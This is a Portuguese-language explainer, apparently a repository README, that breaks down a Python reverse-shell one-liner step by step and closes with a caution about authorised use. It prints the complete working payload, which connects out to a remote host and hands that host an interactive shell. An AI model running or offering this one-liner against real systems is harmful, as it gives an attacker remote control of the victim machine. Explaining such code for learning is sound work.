
<h1 align="center">
   🔗 Code Review de um Reverse Shell
</h1>

<h2>📜  Descrição</h2>

Se você é um entusiasta do hacking e da Segurança da Informação com certeza você já usou ou já ouviu falar sobre o [Reverse Shell Generator](https://www.revshells.com/). É uma plataforma Web que você consegue utilizar um gerador de conexão reversa de diversos tipos de conexões para Windows, Linux e MAC, e com diferentes linguagens como: Python, C, Ruby e por ai vai.

Todo mundo sempre copia e cola um ou outro código de Shell reverso e percebendo isso resolvi questionar como realmente funciona um Reverse Shell. Será mesmo que é só copiar ou colar? Porque não podemos ir a fundo e ver oque podemos aprender com isso? Bora lá!


<h3>👾  O código</h3>

~~~shellscript
RHOST="10.10.10.10";export RPORT=9001;python
-c 'import sys,socket,os,pty;s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
~~~~
Esse código é um exemplo de um "one-liner" em Python que pode ser usado para estabelecer uma conexão de rede com um servidor remoto em um determinado endereço IP (RHOST) 
porta (RPORT) e, em seguida, criar um shell interativo no servidor remoto. Vamos quebrar o código em detalhes! Então sente-se e bora hackear!

<h3>👨‍💻🔎   Analisando o código</h3>

1)
~~~shellscript
export RHOST="10.10.10.10"; export RPORT=9001;
~~~~
Essas são duas instruções export em shell que definem variáveis de ambiente. RHOST é definido como o endereço IP do servidor remoto (neste caso, "10.10.10.10"), e RPORT é definido como o número da porta (neste caso, 9001).

2)
~~~shellscript
python -c '... '
~~~~
 Isso inicia a execução do Python com um comando inline. O código Python entre as 'aspas' simples será executado.
 
 3)
 ~~~shellscript
import sys,socket,os,pty;
~~~~
 Isso importa os módulos Python necessários para a execução do código:
 
  * sys: Fornece acesso a variáveis e funções relacionadas ao sistema.
  * socket: Permite a criação de soquetes para comunicação em rede.
  * os: Fornece funcionalidades relacionadas ao sistema operacional.
  * pty: É usado para interagir com terminais pseudo-TTY.

 4)
 ~~~shellscript
s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
~~~~

Aqui, um objeto de soquete (s) é criado usando a classe socket.socket(). Em seguida, é estabelecida uma conexão com o servidor remoto usando o endereço IP e a porta definidos nas variáveis de ambiente RHOST e RPORT. os.getenv é usado para acessar os valores das variáveis de ambiente definidas anteriormente.

 5)
 ~~~shellscript
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
~~~~
Este é um list comprehension que duplica os descritores de arquivo padrão (stdin, stdout e stderr) para o soquete criado. Isso redireciona a entrada e saída padrão para a conexão de rede, permitindo que comandos sejam enviados e recebidos pelo servidor remoto.

 6)
 ~~~shellscript
pty.spawn("sh")
~~~~
Finalmente, a função pty.spawn é usada para criar um shell interativo no servidor remoto. Isso permite que o usuário interaja com o servidor remoto como se estivesse no prompt de comando do servidor.

Em resumo, este código Python é um exemplo de um "one-liner" que estabelece uma conexão de rede com um servidor remoto e cria um shell interativo para interagir com o servidor. É importante notar que esse tipo de código pode ser usado para fins maliciosos, portanto, deve ser usado com responsabilidade e apenas em ambientes autorizados.


<h3>👨‍💻🔎   Autor</h3>

Fique a vontade para dar feedbacks ou colocar sua análise do código tambem, além de outras análises de Shells reversos diferentes com outras linguagens.


<h4 align="center">
May the force be with you
<h4>


